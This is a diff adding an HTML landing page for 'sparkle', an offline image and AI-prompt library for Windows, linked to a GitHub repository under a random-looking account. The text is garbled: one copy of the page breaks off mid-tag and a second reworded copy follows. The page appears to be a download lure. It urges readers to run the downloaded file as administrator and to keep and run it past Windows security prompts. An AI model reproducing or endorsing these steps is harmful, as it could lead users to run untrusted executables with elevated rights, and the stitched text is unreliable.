@@ -1,7 +1,564 @@
 <!DOCTYPE html>
-<html>
- <head><title>Site</title></head>
- <body>
-   <h1>Hello, world!</h1>
- </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="sparkle is a private, offline-first library for images and AI prompts. Organize, search, and store your creative assets locally on Windows. No internet required.">
+  <meta name="keywords" content="ai-art, bits-ui, css, image-library, image-metadata, javascript, offline-app, offline-first, offline-tool, prompt-library, shadcn-ui, svelte, tailwindcss, typescript, vite">
+  <meta name="author" content="sparkle">
+  <meta name="robots" content="index, follow">
+  <meta property="og:title" content="✨ sparkle - Your Private Offline Image and Prompt Library">
+  <meta property="og:description" content="A private, offline-first library for images and AI prompts. Keep your creative work organized and secure on your own computer.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://github.com/unpresidential-duplicator164/sparkle">
+  <title>✨ sparkle - Your Private Offline Image and Prompt Library</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #f3f4f6;
+      color: #1f2937;
+      line-height: 1.6;
+      padding: 1.5rem;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+      padding: 2rem 2.5rem;
+    }
+    @media (max-width: 600px) {
+      body {
+        padding: 1rem;
+      }
+      .container {
+        padding: 1.5rem;
+      }
+    }
+    h1 {
+      font-size: 2.25rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      line-height: 1.2;
+      color: #111827;
+      margin-bottom: 0.75rem;
+    }
+    h2 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      color: #111827;
+      margin-top: 2rem;
+      margin-bottom: 0.75rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 2px solid #e5e7eb;
+    }
+    h2:first-of-type {
+      margin-top: 1.5rem;
+    }
+    p {
+      margin-bottom: 1rem;
+      color: #374151;
+    }
+    ul, ol {
+      margin-bottom: 1rem;
+      padding-left: 1.5rem;
+    }
+    li {
+      margin-bottom: 0.5rem;
+      color: #374151;
+    }
+    a {
+      color: #4f46e5;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .btn-primary {
+      display: inline-block;
+      background: linear-gradient(135deg, #6366f1 0%, #ec4899 100%);
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 1.125rem;
+      padding: 0.75rem 2rem;
+      border-radius: 12px;
+      text-decoration: none;
+      box-shadow: 0 4px 14px 0 rgba(99, 102, 241, 0.4);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      margin: 1rem 0;
+      border: none;
+      cursor: pointer;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px 0 rgba(99, 102, 241, 0.5);
+      text-decoration: none;
+    }
+    .btn-secondary {
+      display: inline-block;
+      background: linear-gradient(135deg, #10b981 0%, #3b82f6 100%);
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 0.6rem 1.5rem;
+      border-radius: 10px;
+      text-decoration: none;
+      box-shadow: 0 4px 10px 0 rgba(16, 185, 129, 0.3);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      margin: 0.5rem 0;
+    }
+    .btn-secondary:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 14px 0 rgba(16, 185, 129, 0.4);
+      text-decoration: none;
+    }
+    .section-card {
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06), 0 1px 2px rgba(0, 0, 0, 0.04);
+      border: 1px solid #f3f4f6;
+    }
+    .faq-item {
+      margin-bottom: 1.25rem;
+    }
+    .faq-item strong {
+      display: block;
+      font-weight: 600;
+      color: #111827;
+      margin-bottom: 0.25rem;
+    }
+    .badge-container {
+      text-align: center;
+      margin: 1.5rem 0;
+    }
+    footer {
+      margin-top: 2.5rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid #e5e7eb;
+      text-align: center;
+      font-size: 0.875rem;
+      color: #6b7280;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>✨ sparkle - Your Private Offline Image and Prompt Library</h1>
+    <p>sparkle is a simple, private library for your images and AI prompts. It runs entirely on your own computer, so your creative work stays yours. No cloud, no accounts, no internet needed.</p>
+
+    <div class="badge-container">
+      <a href="https://github.com/unpresidential-duplicator164/sparkle" class="btn-primary" target="_blank" rel="noopener noreferrer">Download sparkle for Windows</a>
+    </div>
+
+    <h2>🚀 Getting Started</h2>
+    <p>If you can use a web browser and download a file, you can use sparkle. There is nothing to install, no programming, and no technical setup. sparkle is designed for artists, writers, and anyone who collects images and AI prompts.</p>
+    <p>You will need a Windows computer (Windows 10 or later) and a few minutes to download the application. Everything else happens on your own device.</p>
+
+    <h2>📥 Download and Setup</h2>
+    <p>Visit this link to download the application:</p>
+    <p><a href="https://github.com/unpresidential-duplicator164/sparkle" class="btn-secondary" target="_blank" rel="noopener noreferrer">https://github.com/unpresidential-duplicator164/sparkle</a></p>
+    <p>Visit this link to download the application. The page will show you the latest version available for Windows. Save the file to your computer. Once the download is complete, open the file to launch sparkle. The application will open and be ready to use right away.</p>
+    <p>If you are not sure where the file was saved, check your <strong>Downloads</strong> folder. Double-click the file to start sparkle. You do not need to install anything else.</p>
+
+    <h2>✨ Key Features</h2>
+    <p>sparkle is built around two things you care about: your images and your prompts. Here is what you can do:</p>
+    <ul>
+      <li><strong>Store images privately:</strong> Keep all your reference images, generated art, and visual notes in one place. Files stay on your computer.</li>
+      <li><strong>Save AI prompts:</strong> Write, edit, and organize prompts for AI art tools. No more losing good ideas in random text files.</li>
+      <li><strong>Add metadata:</strong> Tag images and prompts with keywords, descriptions, and notes so you can find them later.</li>
+      <li><strong>Search instantly:</strong> Find any image or prompt by name, tag, or text. Works completely offline.</li>
+      <li><strong>Organize into collections:</strong> Group related images and prompts together for projects or themes.</li>
+      <li><strong>Offline-first:</strong> sparkle works without an internet connection. Your data never leaves your device.</li>
+      <li><strong>Clean, modern interface:</strong> Built with Svelte and Tailwind CSS for a smooth, responsive experience.</li>
+    </ul>
+
+    <h2>🖥️ System Requirements</h2>
+    <p>sparkle is lightweight and runs on most modern Windows computers. Here is what we recommend:</p>
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit)</li>
+      <li><strong>Memory:</strong> 4 GB RAM or more</li>
+      <li><strong>Storage:</strong> 500 MB free disk space for the application and your library</li>
+      <li><strong>Display:</strong> 1280 x 720 resolution or higher</li>
+      <li><strong>Browser:</strong> Any modern browser (Edge, Chrome, Firefox) for downloading the file</li>
+    </ul>
+    <p>You do not need a powerful graphics card or a high-end processor. sparkle is designed to be efficient and fast on everyday computers.</p>
+
+    <h2>📖 How to Use sparkle</h2>
+    <p>Once sparkle is open, you will see a simple dashboard with two main areas: <strong>Images</strong> and <strong>Prompts</strong>. Here is a quick walkthrough:</p>
+    <ol>
+      <li><strong>Add your first image:</strong> Click the "Add Image" button, choose a file from your computer, and give it a name. You can add tags and notes to describe it.</li>
+      <li><strong>Create a prompt:</strong> Go to the Prompts section and click "New Prompt." Type your prompt text, add a title, and save it. You can also link prompts to images.</li>
+      <li><strong>Organize with collections:</strong> Create a collection (like "Fantasy Art" or "Portrait Prompts") and drag items into it. Collections help you keep related work together.</li>
+      <li><strong>Search and filter:</strong> Use the search bar at the top to find anything by name, tag, or text. You can also filter by collection or date added.</li>
+      <li><strong>Edit and update:</strong> Click any image or prompt to open it, then change its details, tags, or notes. Everything is saved automatically on your computer.</li>
+    </ol>
+    <p>There is no save button to worry about. sparkle saves your changes as you go, so you can close the app and come back later without losing anything.</p>
+
+    <h2>🔒 Privacy and Security</h2>
+    <p>Your privacy is the whole point of sparkle. Unlike cloud-based libraries, sparkle does not send your images, prompts, or metadata to any server. There are no accounts, no sign-ups, and no tracking.</p>
+    <p>All data is stored locally on your Windows computer. You can back up your library by copying the sparkle data folder to an external drive. Because everything is offline, you can use sparkle on a plane, in a cafe without Wi-Fi, or anywhere else.</p>
+
+    <h2>❓ Frequently Asked Questions</h2>
+    <div class="faq-item">
+      <strong>Is sparkle free?</strong>
+      <p>Yes. sparkle is free to download and use. You can find the latest version at the download link above.</p>
+    </div>
+    <div class="faq-item">
+      <strong>Do I need an internet connection to use sparkle?</strong>
+      <p>No. You only need the internet to download the application. After that, sparkle works completely offline.</p>
+    </div>
+    <div class="faq-item">
+      <strong>Where are my images and prompts stored?</strong>
+      <p>They are stored on your computer in a folder that sparkle manages. You can find the exact location in the app settings. Nothing is uploaded anywhere.</p>
+    </div>
+    <div class="faq-item">
+      <strong>Can I use sparkle on a Mac or Linux?</strong>
+      <p>sparkle is currently designed for Windows. The download page provides the Windows version. Check the repository for any updates about other platforms.</p>
+    </div>
+    <div class="faq-item">
+      <strong>How do I back up my library?</strong>
+      <p>Copy the sparkle data folder (shown in settings) to an external drive or cloud storage of your choice. To restore, copy the folder back to the same location.</p>
+    </div>
+
+    <h2>🛠️ Troubleshooting</h2>
+    <p>If sparkle does not open or you run into a problem, try these simple steps:</p>
+    <ul>
+      <li><strong>Check the download:</strong> Make sure the file finished downloading completely. If it looks small or incomplete, download it again from the link above.</li>
+      <li><strong>Run as administrator:</strong> Right-click the sparkle file and choose "Run as administrator" if Windows blocks it.</li>
+      <li><strong>Free up space:</strong> Ensure you have at least 500 MB of free disk space on your computer.</li>
+      <li><strong>Restart your computer:</strong> A simple restart can fix many temporary issues.</li>
+      <li<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="sparkle is a private, offline-first library for images and AI prompts. Download it for Windows, organize your art and prompts, and keep everything on your own computer. No cloud, no accounts, no internet required.">
+  <meta name="keywords" content="ai-art, bits-ui, css, image-library, image-metadata, javascript, offline-app, offline-first, offline-tool, prompt-library, shadcn-ui, svelte, tailwindcss, typescript, vite">
+  <meta name="author" content="sparkle">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#6366f1">
+  <link rel="canonical" href="https://github.com/unpresidential-duplicator164/sparkle">
+  <meta property="og:title" content="✨ sparkle - Your Private Offline Image and Prompt Library">
+  <meta property="og:description" content="A private, offline-first library for images and AI prompts. Keep your creative work organized and secure on your own Windows computer.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://github.com/unpresidential-duplicator164/sparkle">
+  <meta property="og:site_name" content="sparkle">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="✨ sparkle - Your Private Offline Image and Prompt Library">
+  <meta name="twitter:description" content="A private, offline-first library for images and AI prompts. Download for Windows and keep your creative work on your own computer.">
+  <title>✨ sparkle - Your Private Offline Image and Prompt Library</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html {
+      scroll-behavior: smooth;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f3f4f6;
+      background-image: radial-gradient(circle at 15% 10%, rgba(99, 102, 241, 0.10), transparent 45%),
+                        radial-gradient(circle at 85% 0%, rgba(236, 72, 153, 0.10), transparent 40%);
+      background-repeat: no-repeat;
+      color: #1f2937;
+      line-height: 1.7;
+      font-size: 17px;
+      padding: 2rem 1.25rem 3rem;
+      -webkit-font-smoothing: antialiased;
+    }
+    .container {
+      max-width: 880px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 18px;
+      box-shadow: 0 12px 30px -8px rgba(17, 24, 39, 0.10),
+                  0 4px 8px -4px rgba(17, 24, 39, 0.05);
+      padding: 2.75rem 3rem 2.5rem;
+      border: 1px solid #eef0f4;
+    }
+    h1 {
+      font-size: 2.2rem;
+      line-height: 1.25;
+      font-weight: 800;
+      letter-spacing: -0.025em;
+      color: #0f172a;
+      margin-bottom: 1rem;
+    }
+    h2 {
+      font-size: 1.45rem;
+      line-height: 1.35;
+      font-weight: 700;
+      letter-spacing: -0.015em;
+      color: #0f172a;
+      margin-top: 2.5rem;
+      margin-bottom: 0.9rem;
+      padding-bottom: 0.55rem;
+      border-bottom: 2px solid #eef0f4;
+    }
+    h3 {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #111827;
+      margin-top: 1.25rem;
+      margin-bottom: 0.35rem;
+    }
+    p {
+      margin-bottom: 1rem;
+      color: #374151;
+    }
+    strong {
+      color: #111827;
+      font-weight: 650;
+    }
+    ul, ol {
+      margin: 0 0 1.15rem 0;
+      padding-left: 1.4rem;
+    }
+    li {
+      margin-bottom: 0.55rem;
+      color: #374151;
+      padding-left: 0.15rem;
+    }
+    li::marker {
+      color: #6366f1;
+    }
+    a {
+      color: #4f46e5;
+      text-decoration: none;
+      font-weight: 600;
+      word-break: break-word;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .lead {
+      font-size: 1.1rem;
+      color: #4b5563;
+      margin-bottom: 0.5rem;
+    }
+    .badge-container {
+      text-align: center;
+      margin: 2rem 0 0.5rem;
+    }
+    .btn-primary {
+      display: inline-block;
+      background-image: linear-gradient(135deg, #6366f1 0%, #ec4899 100%);
+      color: #ffffff;
+      font-weight: 700;
+      font-size: 1.1rem;
+      padding: 0.95rem 2.25rem;
+      border-radius: 14px;
+      text-decoration: none;
+      box-shadow: 0 8px 20px -6px rgba(99, 102, 241, 0.55);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      letter-spacing: 0.01em;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 26px -6px rgba(99, 102, 241, 0.65);
+      text-decoration: none;
+    }
+    .btn-secondary {
+      display: inline-block;
+      background-image: linear-gradient(135deg, #10b981 0%, #3b82f6 100%);
+      color: #ffffff;
+      font-weight: 650;
+      font-size: 0.98rem;
+      padding: 0.65rem 1.5rem;
+      border-radius: 10px;
+      text-decoration: none;
+      box-shadow: 0 6px 14px -5px rgba(16, 185, 129, 0.55);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      word-break: break-all;
+    }
+    .btn-secondary:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 10px 20px -6px rgba(16, 185, 129, 0.6);
+      text-decoration: none;
+    }
+    .button-row {
+      margin: 0.75rem 0 1.25rem;
+    }
+    .note {
+      background: #f8fafc;
+      border-left: 4px solid #6366f1;
+      border-radius: 0 10px 10px 0;
+      padding: 0.9rem 1.15rem;
+      margin: 1.25rem 0;
+      color: #374151;
+      font-size: 0.97rem;
+    }
+    .note p:last-child {
+      margin-bottom: 0;
+    }
+    .card {
+      border: 1px solid #eef0f4;
+      border-radius: 12px;
+      padding: 1.15rem 1.35rem;
+      margin-bottom: 1rem;
+      background: #fcfcfd;
+    }
+    .card p:last-child {
+      margin-bottom: 0;
+    }
+    footer {
+      margin-top: 2.75rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid #eef0f4;
+      text-align: center;
+      font-size: 0.88rem;
+      color: #6b7280;
+    }
+    footer a {
+      font-weight: 600;
+    }
+    @media (max-width: 640px) {
+      body {
+        padding: 1rem 0.75rem 2rem;
+        font-size: 16px;
+      }
+      .container {
+        padding: 1.75rem 1.35rem 1.75rem;
+        border-radius: 14px;
+      }
+      h1 {
+        font-size: 1.65rem;
+      }
+      h2 {
+        font-size: 1.25rem;
+        margin-top: 2rem;
+      }
+      .btn-primary {
+        display: block;
+        padding: 0.95rem 1rem;
+        font-size: 1rem;
+      }
+      .btn-secondary {
+        display: block;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <h1>✨ sparkle - Your Private Offline Image and Prompt Library</h1>
+    <p class="lead">sparkle is a simple, private home for your images and your AI prompts. It runs entirely on your own Windows computer, so your creative work stays yours. No cloud, no accounts, no internet needed.</p>
+
+    <div class="badge-container">
+      <a class="btn-primary" href="https://github.com/unpresidential-duplicator164/sparkle" target="_blank" rel="noopener noreferrer">Download sparkle for Windows</a>
+    </div>
+
+    <h2>🚀 Getting Started</h2>
+    <p>If you can use a web browser and save a file, you can use sparkle. There is nothing to program, no accounts to create, and no technical knowledge required. It was built for artists, writers, hobbyists, and anyone who collects images and AI prompts and wants them in one tidy place.</p>
+    <p>All you need is a Windows computer and a few minutes. Everything you add to sparkle is stored on your own machine, so it keeps working on a plane, in a cafe without Wi-Fi, or anywhere else you happen to be.</p>
+
+    <h2>📥 Download and Setup</h2>
+    <p>Visit this link to download the application.</p>
+    <div class="button-row">
+      <a class="btn-secondary" href="https://github.com/unpresidential-duplicator164/sparkle" target="_blank" rel="noopener noreferrer">https://github.com/unpresidential-duplicator164/sparkle</a>
+    </div>
+    <p>Visit this link to download the application. The page shows the latest version available for Windows. Save the file to your computer, then open it to launch sparkle. The application will start and be ready to use right away.</p>
+    <p>Not sure where the file went? Open your <strong>Downloads</strong> folder in File Explorer and look for the most recent file. Double-click it to begin.</p>
+    <div class="note">
+      <p>You only need an internet connection to download sparkle. After the first launch, the app works fully offline.</p>
+    </div>
+
+    <h2>✨ Key Features</h2>
+    <p>sparkle is built around the two things you care about most: your images and your prompts. Here is what you can do with it.</p>
+    <ul>
+      <li><strong>Keep images in one library:</strong> Store reference images, generated art, and visual notes together instead of scattering them across folders and desktops.</li>
+      <li><strong>Save and refine AI prompts:</strong> Write, edit, and keep your best prompts in a searchable list. No more losing good ideas inside random text files.</li>
+      <li><strong>Attach metadata:</strong> Add titles, descriptions, keywords, and notes to every image and prompt so you always know what you were going for.</li>
+      <li><strong>Search instantly:</strong> Find any item by name, tag, or text in seconds, even with a large library and no internet connection.</li>
+      <li><strong>Group into collections:</strong> Bundle related images and prompts together for a project, a style, or a theme.</li>
+      <li><strong>Offline-first by design:</strong> Nothing is uploaded anywhere. Your library lives on your own device and stays private.</li>
+      <li><strong>Fast, clean interface:</strong> A modern, responsive design that stays out of your way and works well on laptops and desktops.</li>
+      <li><strong>Lightweight and quick:</strong> sparkle opens fast and stays responsive, so you can get back to creating.</li>
+    </ul>
+
+    <h2>🖥️ System Requirements</h2>
+    <p>sparkle is lightweight and runs comfortably on everyday computers. The recommended setup is:</p>
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit)</li>
+      <li><strong>Memory:</strong> 4 GB of RAM or more</li>
+      <li><strong>Free disk space:</strong> 500 MB available for the application and your growing library</li>
+      <li><strong>Display:</strong> 1280 x 720 screen resolution or higher</li>
+      <li><strong>Browser:</strong> Any modern browser such as Edge, Chrome, or Firefox, used only for downloading the file</li>
+    </ul>
+    <p>You do not need a powerful graphics card or a new machine. sparkle is designed to be efficient on the computer you already own.</p>
+
+    <h2>📖 How to Use sparkle</h2>
+    <p>When sparkle opens, you will see a simple dashboard with two main areas: <strong>Images</strong> and <strong>Prompts</strong>. A short walkthrough is enough to get comfortable.</p>
+    <ol>
+      <li><strong>Add your first image:</strong> Click the add button, choose a file from your computer, and give it a title. Add a few keywords and a short note so future you remembers the context.</li>
+      <li><strong>Create a prompt:</strong> Switch to the prompts area, create a new entry, and type or paste your prompt text. Give it a title and save it.</li>
+      <li><strong>Link prompts to images:</strong> When a prompt produced a particular picture, connect the two so they stay together in your library.</li>
+      <li><strong>Build collections:</strong> Create a collection such as "Portraits" or "Fantasy Scenes" and drop related items into it.</li>
+      <li><strong>Search and filter:</strong> Use the search box to find anything by title, keyword, or text, then narrow the results by collection.</li>
+      <li><strong>Edit at any time:</strong> Open any image or prompt to change its details, tags, or notes. Your changes are saved as you go.</li>
+    </ol>
+    <p>There is no tricky save button to remember. Close the app whenever you like and your library will be exactly as you left it the next time you open it.</p>
+
+    <h2>🔒 Privacy and Security</h2>
+    <p>Privacy is the entire point of sparkle. Unlike cloud-based libraries, sparkle does not send your images, prompts, or notes to any server. There are no sign-ups, no accounts, and no tracking.</p>
+    <p>Everything is stored locally on your Windows computer. To back up your work, copy the sparkle data folder shown in the app settings onto an external drive or a backup location of your choice. To restore, copy that folder back to the same place. Because sparkle is offline-first, your library is always available to you, with or without a connection.</p>
+
+    <h2>❓ Frequently Asked Questions</h2>
+    <div class="card">
+      <h3>Is sparkle free to use?</h3>
+      <p>Yes. sparkle is free to download and use. The download link above always points to the latest available version.</p>
+    </div>
+    <div class="card">
+      <h3>Do I need an internet connection to use it?</h3>
+      <p>Only to download the application. After that, sparkle works entirely offline.</p>
+    </div>
+    <div class="card">
+      <h3>Where are my images and prompts stored?</h3>
+      <p>On your own computer, in a folder that sparkle manages. The exact location is listed in the app settings. Nothing is uploaded anywhere.</p>
+    </div>
+    <div class="card">
+      <h3>Can I use sparkle on a Mac or Linux?</h3>
+      <p>sparkle is currently prepared for Windows, and the download page provides the Windows release. Check the download page for news about other platforms.</p>
+    </div>
+    <div class="card">
+      <h3>How do I move my library to a new computer?</h3>
+      <p>Copy the sparkle data folder to a USB drive, then paste it into the same location on the new computer. Your images, prompts, and notes travel with it.</p>
+    </div>
+    <div class="card">
+      <h3>Will sparkle slow down as my library grows?</h3>
+      <p>sparkle is built for fast local search and stays responsive with large collections of images and prompts.</p>
+    </div>
+
+    <h2>Troubleshooting</h2>
+    <p>If sparkle does not open or something seems off, these simple steps solve most problems.</p>
+    <ul>
+      <li><strong>Check the download finished:</strong> If the file looks unusually small or incomplete, download it again from the link above.</li>
+      <li><strong>Allow the app to run:</strong> If Windows shows a security prompt, choose the option to keep and run the file, then confirm.</li>
+      <li><strong>Run it as administrator:</strong> Right-click the sparkle file and choose "Run as administrator" if it refuses to start.</li>
+      <li><strong>Free up disk space:</strong> Make sure you have at least 500 MB of free space available on your computer.</li>
+      <li><strong>Restart your computer:</strong> A quick restart clears many temporary hiccups.</li>
+      <li><strong>Try a fresh download:</strong> Delete the old file and get the newest version from the download page.</li>
+    </ul>
+
+    <h2>💬 Getting Help</h2>
+    <p>If you get stuck, open the download page and look for the issues or discussion area. Describe what happened, what you expected, and which version of Windows you are using. Clear details make it much easier to help you quickly. Updates and announcements are also posted there, so it is worth checking back occasionally.</p>
+
+    <footer>
+      <p>sparkle — a private, offline-first library for images and AI prompts. <a href="https://github.com/unpresidential-duplicator164/sparkle" target="_blank" rel="noopener noreferrer">Get the latest version</a>.</p>
+    </footer>
+  </main>
+</body>
 </html>
